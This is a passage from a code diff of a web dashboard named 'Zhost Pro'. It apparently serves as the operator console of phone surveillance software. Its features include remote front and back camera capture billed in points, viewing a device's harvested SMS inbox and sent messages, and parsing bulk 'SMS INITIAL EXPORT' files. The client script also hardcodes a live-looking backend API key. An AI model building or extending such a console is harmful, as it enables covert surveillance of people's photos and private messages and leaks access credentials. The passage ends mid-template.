-  .camera-photos-title,.camera-photos h3{color:#f8fafc}.camera-photos-sub{color:#94a3b8}
-  #refreshPhotos{background:#334155;border-color:#475569}
-  .photo-item{background:#0f172a;border-color:#334155}
-  .photo-item:hover{border-color:#38bdf8}
-  .detail-page .back-btn{color:#cbd5e1}
+  svg{display:block}
 </style>
 </head>
 <body>
 
-<!-- ═══════════════ LOGIN ═══════════════ -->
-<div id="loginScreen">
-  <div class="login-wrap">
-    <div class="logo-mark">
-      <svg viewBox="0 0 24 24"><path d="M12 15.2a3.2 3.2 0 100-6.4 3.2 3.2 0 000 6.4z"/><path d="M9 2L7.17 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2h-3.17L15 2H9zm3 15c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5z"/></svg>
-    </div>
-    <h1 class="login-title">Zhost Pro</h1>
-    <p class="login-sub">Sign in to access your devices</p>
+<div id="toastContainer"></div>
 
-    <div id="loginAlert" class="alert alert-error"></div>
+<div class="container">
 
-    <div class="form-group">
-      <label class="form-label">Email</label>
-      <input id="emailInput" class="form-input" type="email" placeholder="you@example.com" autocomplete="email">
+  <!-- ═══════════ LOGIN ═══════════ -->
+  <div id="loginScreen">
+    <div class="login-box">
+      <h2>
+        <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="#38bdf8" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
+          <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
+        </svg>
+        Zhost Pro
+      </h2>
+      <input id="emailInput" type="email" placeholder="Email" autocomplete="email">
+      <input id="passwordInput" type="password" placeholder="Password" autocomplete="current-password">
+      <button id="loginBtn">Login</button>
+      <div class="error-msg" id="loginError"></div>
     </div>
-    <div class="form-group">
-      <label class="form-label">Password</label>
-      <input id="passwordInput" class="form-input" type="password" placeholder="••••••••" autocomplete="current-password">
-    </div>
-
-    <button id="loginBtn" class="btn btn-primary" style="margin-top:8px">
-      <svg width="17" height="17" viewBox="0 0 24 24" fill="#fff"><path d="M10 17l5-5-5-5v3H3v4h7v3zm9-14H5c-1.1 0-2 .9-2 2v3h2V5h14v14H5v-3H3v3c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2z"/></svg>
-      <span>Sign In</span>
-    </button>
   </div>
-</div>
 
-<!-- ═══════════════ APP ═══════════════ -->
-<div id="appScreen">
-
-  <header class="app-header">
-    <div class="app-title">
-      <span class="app-title-dot"></span>
-      Zhost Pro
+  <!-- ═══════════ LOADING ═══════════ -->
+  <div id="loadingScreen" class="hidden">
+    <div style="text-align:center;color:#94a3b8">
+      <svg width="42" height="42" viewBox="0 0 24 24" fill="none" stroke="#38bdf8" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M21 12a9 9 0 1 1-6.219-8.56"/>
+      </svg>
+      <div style="margin-top:12px;font-size:13px">Loading...</div>
     </div>
-    <div class="app-user" id="headerUser">-</div>
-  </header>
+  </div>
 
-  <!-- ═══ CAMERA ═══ -->
-  <section id="sec-camera" class="section active">
-    <h1 class="page-title">Remote Camera</h1>
-    <p class="page-sub">Capture a photo on your device</p>
+  <!-- ═══════════ DASHBOARD ═══════════ -->
+  <div id="dashScreen" class="hidden">
 
-    <div class="cam-grid">
-      <button class="cam-card" data-cam="front">
-        <div class="cam-card-icon">
-          <svg viewBox="0 0 24 24"><path d="M20 5h-3.17L15 3H9L7.17 5H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm-8 13c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5z"/></svg>
-        </div>
-        <div class="cam-card-name">Front</div>
-        <div class="cam-card-cost">-1 point</div>
+    <div class="header">
+      <h1>
+        <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#38bdf8" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+          <rect x="3" y="3" width="7" height="9" rx="1"/>
+          <rect x="14" y="3" width="7" height="5" rx="1"/>
+          <rect x="14" y="12" width="7" height="9" rx="1"/>
+          <rect x="3" y="16" width="7" height="5" rx="1"/>
+        </svg>
+        Zhost Pro
+        <span class="live-badge"><span class="live-dot"></span>LIVE</span>
+      </h1>
+      <button class="logout-btn" id="logoutBtn">
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"/>
+          <polyline points="16 17 21 12 16 7"/>
+          <line x1="21" y1="12" x2="9" y2="12"/>
+        </svg>
+        Logout
       </button>
-      <button class="cam-card" data-cam="back">
-        <div class="cam-card-icon">
-          <svg viewBox="0 0 24 24"><path d="M20 5h-3.17L15 3H9L7.17 5H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm-8 13c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5z"/></svg>
-        </div>
-        <div class="cam-card-name">Back</div>
-        <div class="cam-card-cost">-1 point</div>
-      </button>
     </div>
 
-    <div class="stat-card">
-      <span class="stat-label">Available Points</span>
-      <span class="stat-value" id="camPoints">0</span>
-    </div>
-    <div class="stat-card">
-      <span class="stat-label">Status</span>
-      <span class="stat-value" id="camStatus">Ready</span>
+    <div class="device-info" id="deviceInfo">
+      <strong>User:</strong> <span id="userEmail">-</span>
     </div>
 
-    <div class="camera-photos">
-      <div class="camera-photos-head">
-        <div>
-          <div class="camera-photos-title">Captured Photos</div>
-          <div class="camera-photos-sub">Photos from Front and Back camera</div>
-        </div>
-        <button class="icon-btn" id="refreshPhotos" aria-label="Refresh photos">
-          <svg viewBox="0 0 24 24"><path d="M17.65 6.35A7.958 7.958 0 0012 4a8 8 0 108 8h-2a6 6 0 11-1.76-4.24L13 11h7V4l-2.35 2.35z"/></svg>
+    <!-- ═══ MENU ═══ -->
+    <div id="menuScreen">
+      <div class="btn-list">
+
+        <button class="tab-btn" data-tab="camera">
+          <span class="btn-left">
+            <span class="tab-icon">
+              <svg viewBox="0 0 24 24" fill="none" stroke="#ef4444" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"/>
+                <circle cx="12" cy="13" r="4"/>
+              </svg>
+            </span>
+            <span>Camera</span>
+          </span>
+          <span class="btn-right"><span class="arrow">›</span></span>
         </button>
-      </div>
-      <div id="photoGrid" class="photo-grid"></div>
-      <div id="photosEmpty" class="empty-state" style="display:none">
-        <svg viewBox="0 0 24 24"><path d="M21 19V5c0-1.1-.9-2-2-2H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2zM8.5 13.5l2.5 3.01L14.5 12l4.5 6H5l3.5-4.5z"/></svg>
-        <p>No photos yet</p>
+
+        <button class="tab-btn" data-tab="sms">
+          <span class="btn-left">
+            <span class="tab-icon">
+              <svg viewBox="0 0 24 24" fill="none" stroke="#38bdf8" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/>
+                <polyline points="22,6 12,13 2,6"/>
+              </svg>
+            </span>
+            <span>SMS</span>
+          </span>
+          <span class="btn-right"><span class="arrow">›</span></span>
+        </button>
+
+        <button class="tab-btn" data-tab="profile">
+          <span class="btn-left">
+            <span class="tab-icon">
+              <svg viewBox="0 0 24 24" fill="none" stroke="#a855f7" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/>
+                <circle cx="12" cy="7" r="4"/>
+              </svg>
+            </span>
+            <span>Profile</span>
+          </span>
+          <span class="btn-right"><span class="arrow">›</span></span>
+        </button>
+
       </div>
     </div>
-  </section>
 
-
-  <!-- ═══ SMS ═══ -->
-  <section id="sec-sms" class="section">
-    <div class="list-header">
-      <h2>Messages</h2>
-      <button class="icon-btn" id="refreshSms" aria-label="Refresh">
-        <svg viewBox="0 0 24 24"><path d="M17.65 6.35A7.958 7.958 0 0012 4a8 8 0 108 8h-2a6 6 0 11-1.76-4.24L13 11h7V4l-2.35 2.35z"/></svg>
+    <!-- ═══ DATA SCREEN ═══ -->
+    <div id="dataScreen">
+      <button class="back-btn" id="backBtn">
+        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+          <line x1="19" y1="12" x2="5" y2="12"/>
+          <polyline points="12 19 5 12 12 5"/>
+        </svg>
+        Back
       </button>
-    </div>
-    <div id="smsList" class="chat-list"></div>
-    <div id="smsEmpty" class="empty-state" style="display:none">
-      <svg viewBox="0 0 24 24"><path d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2z"/></svg>
-      <p>No messages yet</p>
-    </div>
-  </section>
 
-  <!-- ═══ PROFILE ═══ -->
-  <section id="sec-profile" class="section">
-    <div class="profile-hero">
-      <div class="profile-avatar" id="profAvatar">U</div>
-      <div class="profile-name" id="profName">-</div>
-      <div class="profile-email" id="profEmail">-</div>
-      <div class="profile-points">
-        <svg viewBox="0 0 24 24"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"/></svg>
-        <span id="profPoints">0</span>
-        <span style="font-size:12px;opacity:.85;font-weight:500">points</span>
+      <!-- ═══ CAMERA TAB ═══ -->
+      <div id="tab-camera" class="tab-content">
+        <div class="page-title">
+          <svg viewBox="0 0 24 24" fill="none" stroke="#ef4444" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"/>
+            <circle cx="12" cy="13" r="4"/>
+          </svg>
+          Camera
+        </div>
+
+        <div class="cam-grid">
+          <button class="cam-card" data-cam="front">
+            <div class="cam-card-icon">
+              <svg viewBox="0 0 24 24"><path d="M20 5h-3.17L15 3H9L7.17 5H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm-8 13c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5z"/></svg>
+            </div>
+            <div class="cam-card-name">Front</div>
+            <div class="cam-card-cost">-1 point</div>
+          </button>
+          <button class="cam-card" data-cam="back">
+            <div class="cam-card-icon">
+              <svg viewBox="0 0 24 24"><path d="M20 5h-3.17L15 3H9L7.17 5H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm-8 13c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5z"/></svg>
+            </div>
+            <div class="cam-card-name">Back</div>
+            <div class="cam-card-cost">-1 point</div>
+          </button>
+        </div>
+
+        <div class="stats">
+          <div class="stat-card"><div class="num" id="camPoints">0</div><div class="lbl">Points</div></div>
+          <div class="stat-card"><div class="num" id="photoTotal">0</div><div class="lbl">Photos</div></div>
+        </div>
+
+        <div class="info-bar" id="camStatus">Ready</div>
+
+        <div class="photo-header">
+          <h3>Captured Photos</h3>
+          <span class="photo-count" id="photoCount">0</span>
+        </div>
+
+        <div id="photoGrid" class="photo-grid"></div>
+        <div id="photosEmpty" class="placeholder hidden" style="margin-top:12px">
+          <div class="icon">
+            <svg viewBox="0 0 24 24" fill="none" stroke="#64748b" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+              <rect x="3" y="3" width="18" height="18" rx="2" ry="2"/>
+              <circle cx="8.5" cy="8.5" r="1.5"/>
+              <polyline points="21 15 16 10 5 21"/>
+            </svg>
+          </div>
+          <h3>No photos yet</h3>
+          <p>Tap Front or Back to capture a photo</p>
+        </div>
       </div>
-    </div>
 
-    <div class="menu-group">
-      <div class="menu-row">
-        <span class="menu-label">User ID</span>
-        <span class="menu-value" id="profUserId">-</span>
+      <!-- ═══ SMS TAB (ALL SHOWN — no click needed) ═══ -->
+      <div id="tab-sms" class="tab-content">
+        <div class="page-title">
+          <svg viewBox="0 0 24 24" fill="none" stroke="#38bdf8" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/>
+            <polyline points="22,6 12,13 2,6"/>
+          </svg>
+          Messages
+        </div>
+
+        <div class="stats">
+          <div class="stat-card"><div class="num" id="smsTotal">0</div><div class="lbl">Total</div></div>
+          <div class="stat-card"><div class="num" id="smsIn">0</div><div class="lbl">Inbox</div></div>
+          <div class="stat-card"><div class="num" id="smsOut">0</div><div class="lbl">Sent</div></div>
+        </div>
+
+        <div id="smsStatus" class="info-bar" style="display:none"></div>
+
+        <div id="smsList" class="sms-list"></div>
+        <div id="smsEmpty" class="placeholder hidden">
+          <div class="icon">
+            <svg viewBox="0 0 24 24" fill="none" stroke="#64748b" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/>
+              <polyline points="22,6 12,13 2,6"/>
+            </svg>
+          </div>
+          <h3>No messages</h3>
+          <p>SMS messages will appear here</p>
+        </div>
       </div>
-      <div class="menu-row">
-        <span class="menu-label">Status</span>
-        <span class="menu-value" id="profStatus">-</span>
+
+      <!-- ═══ PROFILE TAB ═══ -->
+      <div id="tab-profile" class="tab-content">
+        <div class="page-title">
+          <svg viewBox="0 0 24 24" fill="none" stroke="#a855f7" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/>
+            <circle cx="12" cy="7" r="4"/>
+          </svg>
+          Profile
+        </div>
+
+        <div class="profile-hero">
+          <div class="profile-avatar" id="profAvatar">U</div>
+          <div class="profile-name" id="profName">-</div>
+          <div class="profile-email" id="profEmail">-</div>
+          <div class="profile-points">
+            <svg viewBox="0 0 24 24"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"/></svg>
+            <span id="profPoints">0</span>
+            <span style="font-size:12px;opacity:.75;font-weight:600">points</span>
+          </div>
+        </div>
+
+        <div class="menu-group">
+          <div class="menu-row">
+            <span class="menu-label">User ID</span>
+            <span class="menu-value" id="profUserId" style="font-size:11px">-</span>
+          </div>
+          <div class="menu-row">
+            <span class="menu-label">Status</span>
+            <span class="menu-value" id="profStatus">-</span>
+          </div>
+        </div>
       </div>
-    </div>
 
-    <button class="logout-btn" id="logoutBtn">
-      <svg viewBox="0 0 24 24"><path d="M17 7l-1.41 1.41L18.17 11H8v2h10.17l-2.58 2.58L17 17l5-5zM4 5h8V3H4c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h8v-2H4V5z"/></svg>
-      Sign Out
-    </button>
-  </section>
-
-  <!-- Bottom Nav -->
-  <nav class="bottom-nav">
-    <div class="nav-item active" data-tab="camera">
-      <svg viewBox="0 0 24 24"><path d="M9 2L7.17 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2h-3.17L15 2H9zm3 15c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5z"/></svg>
-      Camera
     </div>
-    <div class="nav-item" data-tab="sms">
-      <svg viewBox="0 0 24 24"><path d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2z"/></svg>
-      SMS
-    </div>
-    <div class="nav-item" data-tab="profile">
-      <svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
-      Profile
-    </div>
-  </nav>
-</div>
-
-<!-- ═══════════════ SMS DETAIL PAGE ═══════════════ -->
-<div id="smsDetail" class="detail-page">
-  <header class="detail-header">
-    <button class="back-btn" id="smsDetailBack" aria-label="Back">
-      <svg viewBox="0 0 24 24"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
-    </button>
-    <div class="detail-info">
-      <div class="detail-name" id="smsDetailName">Sender</div>
-      <div class="detail-sub" id="smsDetailSub">-</div>
-    </div>
-  </header>
-  <div class="detail-body" id="smsDetailBody"></div>
+  </div>
 </div>
 
 <!-- Lightbox -->
@@ -735,9 +607,6 @@
   <div class="overlay-text" id="overlayText">Loading...</div>
 </div>
 
-<!-- Toast -->
-<div id="toast" class="toast"></div>
-
 <script>
 /* ═══ CONFIG ═══ */
 const API = "https://fra.cloud.appwrite.io/v1";
@@ -750,33 +619,30 @@ const T_SMS = "sms";
 const BUCKET = "photos";
 const CAMERA_COST = 1;
 
-/* ═══ API KEY (1-day test) ═══ */
 const API_KEY = "standard_36c054f57ff04721e832a77cdd0702a731e2c5cecb28603281b456dacc2bf730ab3967ec377cc8647843233f5d1e3bb6b98a5f30869c2aa12cf244b56e978651cae2efbc4b0f231a6c3eff78403b93ceda7d534e68e7b9bd4835c019e71b40cea5e840aa9c4a698cce4b3e039b94defff42ba04244e57a507bfa8fc97fe4fe27";
 
-/* ═══ STATE ═══ */
 let state = { userRow: null, photos: [], sms: [] };
-
 const $ = (id) => document.getElementById(id);
 
 /* ═══ HELPERS ═══ */
-function toast(msg, type = "") {
-  const t = $("toast");
-  t.textContent = msg;
-  t.className = "toast show " + type;
-  clearTimeout(t._tm);
-  t._tm = setTimeout(() => { t.className = "toast " + type; }, 2600);
+function toast(msg, type = "info") {
+  const c = $("toastContainer");
+  const el = document.createElement("div");
+  el.className = "toast " + type;
+  el.textContent = msg;
+  c.appendChild(el);
+  setTimeout(() => {
+    el.classList.add("hiding");
+    setTimeout(() => el.remove(), 300);
+  }, 3000);
 }
 function showOverlay(text = "Loading...") {
   $("overlayText").textContent = text;
   $("overlay").classList.add("show");
 }
 function hideOverlay() { $("overlay").classList.remove("show"); }
-function showLoginError(msg) {
-  const a = $("loginAlert");
-  a.textContent = msg;
-  a.className = "alert alert-error show";
-}
-function hideLoginError() { $("loginAlert").className = "alert alert-error"; }
+function showLoginError(msg) { $("loginError").textContent = msg; }
+function hideLoginError() { $("loginError").textContent = ""; }
 function escapeHtml(s) {
   return String(s || "").replace(/[&<>"']/g, c => ({
     "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;"
@@ -786,25 +652,8 @@ function fmtTime(t) {
   try {
     const d = new Date(t);
     if (isNaN(d.getTime())) return t;
-    const now = new Date();
-    const diff = (now - d) / 1000;
-    if (diff < 60) return "Just now";
-    if (diff < 3600) return Math.floor(diff/60) + " min";
-    if (d.toDateString() === now.toDateString())
-      return d.toLocaleTimeString([], {hour: "2-digit", minute: "2-digit"});
-    const y = new Date(now); y.setDate(y.getDate() - 1);
-    if (d.toDateString() === y.toDateString()) return "Yesterday";
-    if (now.getFullYear() === d.getFullYear())
-      return d.toLocaleDateString([], {month: "short", day: "numeric"});
-    return d.toLocaleDateString([], {month: "short", day: "numeric", year: "numeric"});
-  } catch (e) { return t; }
-}
-function fmtFull(t) {
-  try {
-    const d = new Date(t);
-    if (isNaN(d.getTime())) return t;
     return d.toLocaleString([], {
-      month: "short", day: "numeric", year: "numeric",
+      month: "short", day: "numeric",
       hour: "2-digit", minute: "2-digit"
     });
   } catch (e) { return t; }
@@ -889,11 +738,17 @@ async function loadPhotos() {
   const userId = state.userRow.userId;
   const q = encodeURIComponent(JSON.stringify({method:"equal",attribute:"capturedByUserId",values:[userId]}));
   const q2 = encodeURIComponent(JSON.stringify({method:"orderDesc",attribute:"$createdAt"}));
-  const q3 = encodeURIComponent(JSON.stringify({method:"limit",values:[50]}));
-  const res = await api("GET", `/tablesdb/${DB}/tables/${T_PHOTOS}/rows?queries[]=${q}&queries[]=${q2}&queries[]=${q3}`);
-  const photos = (res && res.rows ? res.rows : []).filter(p => p.fileId && !p.isDeleted);
-  state.photos = photos;
-  renderPhotos(photos);
+  const q3 = encodeURIComponent(JSON.stringify({method:"limit",values:[60]}));
+  try {
+    const res = await api("GET",
+      `/tablesdb/${DB}/tables/${T_PHOTOS}/rows?queries[]=${q}&queries[]=${q2}&queries[]=${q3}`);
+    const photos = (res && res.rows ? res.rows : []).filter(p => p.fileId && !p.isDeleted);
+    state.photos = photos;
+    renderPhotos(photos);
+  } catch (e) {
+    console.warn("Photos:", e.message);
+    renderPhotos([]);
+  }
 }
 
 async function fetchPhotoBlobUrl(fileId) {
@@ -909,13 +764,18 @@ async function fetchPhotoBlobUrl(fileId) {
 async function renderPhotos(photos) {
   const grid = $("photoGrid");
   const empty = $("photosEmpty");
+  const count = $("photoCount");
+  const total = $("photoTotal");
   grid.innerHTML = "";
-  if (!photos.length) { empty.style.display = "block"; return; }
-  empty.style.display = "none";
+  if (count) count.textContent = photos.length;
+  if (total) total.textContent = photos.length;
+
+  if (!photos.length) { empty.classList.remove("hidden"); return; }
+  empty.classList.add("hidden");
 
   for (const p of photos) {
     const div = document.createElement("div");
-    div.className = "photo-item";
+    div.className = "photo-tile";
     const sp = document.createElement("div");
     sp.className = "spinner";
     div.appendChild(sp);
@@ -925,12 +785,16 @@ async function renderPhotos(photos) {
       const blobUrl = await fetchPhotoBlobUrl(p.fileId);
       const img = document.createElement("img");
       img.src = blobUrl;
-      img.onload = () => { img.classList.add("loaded"); sp.remove(); };
-      div.appendChild(img);
+      img.onload = () => sp.remove();
+      div.insertBefore(img, sp);
       div.onclick = () => openLightbox(blobUrl);
+      const pd = document.createElement("div");
+      pd.className = "pdate";
+      pd.textContent = fmtTime(p.$createdAt);
+      div.appendChild(pd);
     } catch (e) {
       sp.remove();
-      div.innerHTML = '<div style="color:#EF4444;font-size:10px;text-align:center;padding:12px 4px">Failed</div>';
+      div.innerHTML = '<div style="color:#ef4444;font-size:10px;text-align:center;padding:20px 4px">✕</div>';
     }
   }
 }
@@ -943,142 +807,216 @@ $("lightboxClose").onclick = () => {
   $("lightbox").classList.remove("show");
   $("lightboxImg").src = "";
 };
+$("lightbox").onclick = (e) => {
+  if (e.target.id === "lightbox") {
+    $("lightbox").classList.remove("show");
+    $("lightboxImg").src = "";
+  }
+};
 
-/* ═══ SMS ═══ */
+/* ═══════════════════════════════════════════════════════
+   SMS — Parse batch file content, show ALL messages
+   ═══════════════════════════════════════════════════════ */
+
+/**
+ * Parse batch txt file content
+ * Format example:
+ * ═══════════════════════════════════════
+ *   SMS INITIAL EXPORT
+ * ═══════════════════════════════════════
+ * Total    : 100 messages
+ * Generated: ...
+ * ═══════════════════════════════════════
+ *
+ * ────── SMS #1 ──────
+ * FROM : MYTEL
+ * NUM  : 12345
+ * TIME : 2025-10-07 10:30:00
+ *
+ * Body message here...
+ *
+ * ────── SMS #2 ──────
+ * ...
+ */
+function parseBatchTxt(text) {
+  const results = [];
+  // Split by SMS markers "────── SMS #N ──────"
+  const blocks = text.split(/─+\s*SMS\s*#\d+\s*─+/);
+
+  for (let i = 1; i < blocks.length; i++) {
+    const block = blocks[i];
+    // Extract fields
+    const fromMatch = block.match(/FROM\s*:\s*([^\n]+)/);
+    const numMatch = block.match(/NUM\s*:\s*([^\n]+)/);
+    const timeMatch = block.match(/TIME\s*:\s*([^\n]+)/);
+    const typeMatch = block.match(/TYPE\s*:\s*([^\n]+)/);
+
+    const from = fromMatch ? fromMatch[1].trim() : "Unknown";
+    const num = numMatch ? numMatch[1].trim() : "";
+    const time = timeMatch ? timeMatch[1].trim() : "";
+    const type = typeMatch ? typeMatch[1].trim() : "inbox";
+
+    // Body: everything after TIME line (or after the last field)
+    let body = "";
+    if (timeMatch) {
+      body = block.substring(timeMatch.index + timeMatch[0].length);
+    } else if (fromMatch) {
+      body = block.substring(fromMatch.index + fromMatch[0].length);
+    } else {
+      body = block;
+    }
+    // Trim whitespace and remove trailing/leading dashes
+    body = body.replace(/^\s*\n/, "").replace(/\n\s*$/, "").trim();
+
+    results.push({
+      from: from,
+      num: num,
+      time: time,
+      type: type,
+      body: body
+    });
+  }
+
+  return results;
+}
+
+/**
+ * Parse single SMS (kind=single) — just one message
+ */
+function parseSingleSms(row) {
+  const senderName = row.senderName || row.sender || "Unknown";
+  const time = row.receivedAt ? fmtTime(row.receivedAt) : "";
+  const type = (row.type || "inbox").toLowerCase();
+  return [{
+    from: senderName,
+    num: row.sender || "",
+    time: time,
+    type: type,
+    body: row.body || ""
+  }];
+}
+
 async function loadSms() {
   if (!state.userRow) return;
   const userId = state.userRow.userId;
   const q = encodeURIComponent(JSON.stringify({method:"equal",attribute:"ownerUserId",values:[userId]}));
   const q2 = encodeURIComponent(JSON.stringify({method:"orderDesc",attribute:"receivedAt"}));
-  const q3 = encodeURIComponent(JSON.stringify({method:"limit",values:[100]}));
-  const res = await api("GET", `/tablesdb/${DB}/tables/${T_SMS}/rows?queries[]=${q}&queries[]=${q2}&queries[]=${q3}`);
-  const rows = (res && res.rows ? res.rows : []).filter(r => !r.isDeleted);
-  state.sms = rows;
-  renderSms(rows);
+  const q3 = encodeURIComponent(JSON.stringify({method:"limit",values:[50]}));
+  try {
+    const res = await api("GET",
+      `/tablesdb/${DB}/tables/${T_SMS}/rows?queries[]=${q}&queries[]=${q2}&queries[]=${q3}`);
+    const rows = (res && res.rows ? res.rows : []).filter(r => !r.isDeleted);
+    state.sms = rows;
+    await renderSms(rows);
+  } catch (e) {
+    console.warn("SMS:", e.message);
+    renderSmsEmpty();
+  }
 }
 
-function renderSms(rows) {
+async function renderSms(rows) {
   const el = $("smsList");
   const empty = $("smsEmpty");
+  const status = $("smsStatus");
+
   el.innerHTML = "";
-  if (!rows.length) { empty.style.display = "block"; return; }
-  empty.style.display = "none";
 
-  for (const r of rows) {
-    const type = (r.type || "inbox").toLowerCase();
-    const isOut = type === "sent" || type === "outbox";
-    const dir = isOut ? "out" : "in";
-    const kind = (r.kind || "single").toLowerCase();
-    const isBatch = kind === "batch" || kind === "initial" || kind === "offline";
-
-    const senderName = r.senderName || r.sender || "Unknown";
-    const preview = (r.body || "").split("\n")[0].slice(0, 120);
-
-    let avClass = "in";
-    let badgeClass = "in";
-    let badgeText = "IN";
-    if (isBatch) {
-      avClass = "batch";
-      badgeClass = "batch";
-      badgeText = "BATCH";
-    } else if (isOut) {
-      avClass = "out";
-      badgeClass = "out";
-      badgeText = "OUT";
-    }
-
-    const row = document.createElement("div");
-    row.className = "chat-row";
-    row.innerHTML = `
-      <div class="chat-avatar ${avClass}">${escapeHtml(getInitial(senderName))}</div>
-      <div class="chat-main">
-        <div class="chat-top">
-          <div class="chat-name">${escapeHtml(senderName)}</div>
-          <div class="chat-time">${escapeHtml(fmtTime(r.receivedAt))}</div>
-        </div>
-        <div class="chat-preview">
-          <span class="chat-badge ${badgeClass}">${badgeText}</span>${escapeHtml(preview)}
-        </div>
-      </div>
-    `;
-    row.onclick = () => openSmsDetail(r);
-    el.appendChild(row);
+  if (!rows.length) {
+    empty.classList.remove("hidden");
+    $("smsTotal").textContent = "0";
+    $("smsIn").textContent = "0";
+    $("smsOut").textContent = "0";
+    if (status) status.style.display = "none";
+    return;
   }
-}
+  empty.classList.add("hidden");
 
-/* ═══ SMS DETAIL PAGE ═══ */
-let currentDetail = null;
+  // Parse ALL messages
+  let allMessages = [];
+  let batchCount = 0;
+  let singleCount = 0;
 
-async function openSmsDetail(sms) {
-  currentDetail = sms;
-  const senderName = sms.senderName || sms.sender || "Unknown";
-  $("smsDetailName").textContent = senderName;
-  $("smsDetailSub").textContent = sms.sender || "";
-
-  const body = $("smsDetailBody");
-  body.innerHTML = "";
-
-  // Loading
-  body.innerHTML = '<div class="detail-empty"><div class="spinner" style="position:static;transform:none"></div></div>';
-
-  // Show page
-  $("smsDetail").classList.add("show");
-  document.body.style.overflow = "hidden";
-
-  // Load content
-  try {
-    const kind = (sms.kind || "single").toLowerCase();
+  for (const row of rows) {
+    const kind = (row.kind || "single").toLowerCase();
     const isBatch = kind === "batch" || kind === "initial" || kind === "offline";
 
-    if (isBatch && sms.fileId) {
-      // Fetch txt file
-      const url = `${API}/storage/buckets/${BUCKET}/files/${sms.fileId}/view?project=${PROJECT}`;
-      const res = await fetch(url, {
-        headers: { "X-Appwrite-Key": API_KEY, "X-Appwrite-Project": PROJECT },
-      });
-      if (!res.ok) throw new Error("HTTP " + res.status);
-      const text = await res.text();
-
-      body.innerHTML = `
-        <div class="msg-header">
-          <span>${escapeHtml(sms.fileName || "Batch File")}</span>
-          <div class="msg-header-line"></div>
-        </div>
-        <div class="msg-bubble">
